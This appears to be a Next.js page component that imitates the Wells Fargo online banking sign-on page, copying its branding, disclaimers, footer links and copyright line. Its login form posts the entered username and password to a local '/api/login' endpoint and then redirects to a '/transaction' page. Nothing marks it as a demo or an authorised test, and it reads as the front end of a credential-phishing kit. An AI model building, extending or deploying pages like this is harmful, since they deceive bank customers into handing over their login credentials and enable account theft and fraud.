
"use client"
import axios from "axios";
import Image from "next/image";
import { Heroicon } from '../components/icons'; // Importing icons
// import {HandBurger} from "../components/icons"
import { useEffect, useState } from "react";
import Link from "next/link";
import { ClockIcon } from "@heroicons/react/16/solid";
import { LockClosedIcon } from "@heroicons/react/24/outline";

export default function Main() {

  const [isLoading, setIsLoading] = useState(false)
    const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

const handleSubmit = async (event: { preventDefault: () => void; }) => {
  event.preventDefault();

  //Check if both username and password are not empty
  if (!username.trim() ||!password.trim()){
    return alert("Please fill in both username and password.");
  }
  if(!username && !password){
    return alert("login required")
  }
  setIsLoading(true);

  try {
    const response = await axios.post('/api/login', {
      username,
      password
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });

    const data = response.data; // Use.data property to access the response body
    console.log(data);

    // if successful navigate to thank you page
    // window.location.href = '/thank-you';
      if (response.status >= 200 && response.status < 300) {
        // window.location.href = '/thank-you';
        window.location.href = '/transaction';

   }
    // 
    // Clear username and password fields
    setUsername('');
    setPassword('');
  } catch (error) {
    console.error(error);
    // Optionally, handle errors here
  } finally {
    setIsLoading(false);
  }
};
// const MyComponent = () => {
//   const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);

//   useEffect(() => {
//     const handleResize = () => {
//       setIsMobile(window.innerWidth <= 768);
//     };

//     window.addEventListener('resize', handleResize);

//     return () => {
//       window.removeEventListener('resize', handleResize);
//     };
//   }, []);

//   const backgroundColor = isMobile? 'black' : 'url("/assets/background.jpg")';
// https://heroicons.com/


  return (
    
    <main style={{

      backgroundImage: "url('/assets/background.jpg')",
      backgroundAttachment: 'fixed',
      backgroundSize: 'cover',
      backgroundRepeat: 'no-repeat',
      backgroundPosition: 'center center',
      height: '100%', // Example height, adjust as needed
              width: '100%', // Example width, adjust as needed
      zIndex:9999}}>
        
        <div className='flex justify-between items-center text-white py-2 px-[20%] bg-red-600 border border-b-2 border-b-yellow-300'//</main>style={{position: 'fixed', top: 0, left: 0, right: 0, zIndex: 9999}}..//>
      >
      <div className="flex flex-col font-bold text-[25px]">
          <span>WELLS FARGO</span>
        </div>
        <div className='space-x-4 space-y-10 text-xs'>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500"> <LockClosedIcon className=" m-h-5 w-5 mr-2" /> {/* Heroicon Icon */}
          Customer Service</a></Link>
          <Link href="/about" legacyBehavior><a className="hover:text-gray-500">Atms/Locations</a></Link>
          <Link href="/contact" legacyBehavior><a className="hover:text-gray-500">Español</a></Link>
        </div>
</div>

    <div className="container w-full sm:w-[80%] md:w-[80%] lg:w-[50%] mx-auto mt-22 px-4 filter contrast-100">
      <div className="flex flex-col items-center justify-center space-y-4 p-6 rounded-md shadow-xl bg-white mt-24">
         <div className="flex flex-col items-center">
         <span className="text-[25px] font-serif-cambria">Good morning</span> <br />
          <div className="text-sm -mt-2">
            <span>Sign on to manage your accounts</span>
          </div>
          </div>
          <form onSubmit={handleSubmit} className=" space-y-5 p-8 rounded-md shadow-x1">
        <label htmlFor="username" className="block text-sm font-medium text-gray-500">Username</label>
        <input
          id="username"
          type="text"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
        />
        <label htmlFor="password" className="block text-sm font-medium text-gray-500">Password</label>
        <input
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
        />
      
        <button
          disabled={!(username.trim() ||!password.trim()) ||isLoading}
          className={`w-full ${isLoading? "bg-gray-400 cursor-not-allowed py-2 px-4": "bg-blue-500 hover:bg-[#1c3666] text-white font-bold py-2 px-20 rounded-full"}`}
        >
          {isLoading? (
            <div className="flex items-center justify-center">
              <div className="animate-spin rounded-full h-6 w-6 border-t-2 border-b-2 border-white"></div>
            </div>
          ) : (
        
            "Sign in"
          )}
        </button>
        <div className="flex justify-center items-center text-gray-600 text-xs mx-auto underline text-underline-offset-2">
        <span>Forgot username or password? </span>
        </div>
      </form> 
        </div>
        </div>
        <div className="container w-full mx-auto sm:w-[50%] md:w-[50%] lg:w-[48%] mt-3 bg-white rounded border ">
        <div className="justify-center items-center font-bold px-9 -py-3">
        <h2>Investment and Insurance Products are:</h2>
        <ul className="list-disc">
          <li> <span> Not Insured by the FDIC or Any Federal Government Agency</span></li> <br />
          <li><span>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</span></li><br />
          <li><span>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</span></li>
          </ul>
      </div>
      </div>
        <div className="flex justify-center items-center bg-[#edebe4] py-16 px-4 mt-6 text-xs">
          <form>
          <span>
          <div className='flex-col w-full mx-auto space-x-4 space-y-10 text-xs'>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500">About Wells Fargo |</a></Link>
          <Link href="/about" legacyBehavior><a className="hover:text-gray-500">Online Access Agreement |</a></Link>
          <Link href="/contact" legacyBehavior><a className="hover:text-gray-500">Privacy, Cookies, Security & Legal |</a></Link>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Notice of Data Collection |</a></Link>
          <Link href="/about" legacyBehavior><a className="hover:text-gray-500">Report Email Fraud |</a></Link>
          <Link href="/contact" legacyBehavior><a className="hover:text-gray-500">Security Center |</a></Link>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500">Sitemap |</a></Link>
          <Link href="/about" legacyBehavior><a className="hover:text-gray-500">Ad Choices |</a></Link>
          <Link href="/contact" legacyBehavior><a className="hover:text-gray-500">Give Us Feedback |</a></Link>
        </div>
          </span>
          
          <footer>© 1999 - 2024 Wells Fargo. All rights reserved. NMLSR ID 399801</footer>
          
          </form>
        </div>
   </main>
  );
}